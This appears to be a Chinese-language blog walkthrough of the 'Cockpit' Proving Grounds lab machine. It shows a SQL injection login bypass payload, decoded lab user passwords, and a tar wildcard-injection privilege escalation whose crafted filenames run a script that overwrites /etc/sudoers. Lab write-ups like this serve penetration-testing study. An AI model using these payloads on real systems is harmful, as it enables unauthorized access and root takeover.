---
title: '[PG] Cockpit'
date: 2025-04-06 19:37 +0900
categories: [hack,PG]
tags: [sql]
---

## information

![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image.png>)
> port scan 

有两个值得我们关注的端口
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-11.png>)
服务器管理系统
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-2.png>)
Web站点
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-3.png>)
通过扫描端口找到一个登录页面
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-10.png>)
没有直接可以利用的方式，对于登录框，我们尝试sql注入
这里做了长度的限制，我选择使用` 'or+true# `
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-4.png>)
> http

![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-5.png>)
成功登录
|Username|Password|Decode|
|---|---|---|
|james|Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=|canttouchhhthiss@455152|
|cameron|dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy|thisscanttbetouchedd@455152|

获得两个用户凭据，

![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-6.png>)
成功登入后台获得服务器shell
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-7.png>)
反弹shell
`sudo -l`发现有特权命令
![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-12.png>)
> 补一张截图

![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-8.png>)



```sh
james@blaze:/tmp$ echo "" > '--checkpoint-action=exec=/bin/bash'
bash: --checkpoint-action=exec=/bin/bash: No such file or directory
james@blaze:/tmp$ echo "" > '--checkpoint-action=exec=/bin/sh'
bash: --checkpoint-action=exec=/bin/sh: No such file or directory
```
这样不能成功，换一种方式，用root权限执行我们预先写好的脚本。

```sh
#at target machine, create 2 files
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
#then create a payload.sh with below content, you can create on your kali machine and transfer to target machine.
echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers
chmod +x payload.sh
#execute the tar
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

![alt text](<../assets/img/2025-04-06-[PG] Cockpit.assets/image-9.png>)

## conclusion
- 尝试密码复用是一个有效的策略。
- 开始渗透之前整体过一下环境。